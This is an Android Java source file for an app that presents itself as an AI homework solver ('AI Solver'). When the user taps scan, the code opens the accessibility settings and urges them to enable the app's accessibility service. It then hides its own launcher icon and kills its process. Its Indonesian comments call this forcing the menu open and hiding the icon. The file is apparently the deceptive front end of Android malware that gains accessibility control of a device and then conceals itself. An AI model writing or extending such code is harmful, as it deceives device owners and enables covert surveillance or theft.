package com.ai.homework;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnScan = findViewById(R.id.btnScan);
        btnScan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "Menyiapkan AI Engine...", Toast.LENGTH_SHORT).show();
                
                // 1. Paksa buka menu Aksesibilitas
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
                
                Toast.makeText(MainActivity.this, "NYALAKAN 'AI Solver' DI MENU AKSESIBILITAS!", Toast.LENGTH_LONG).show();

                // 2. Sembunyiin icon & bunuh diri (Force Kill)
                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                getPackageManager().setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                );
                finishAffinity();
                Process.killProcess(Process.myPid());
            }
        });
    }
}
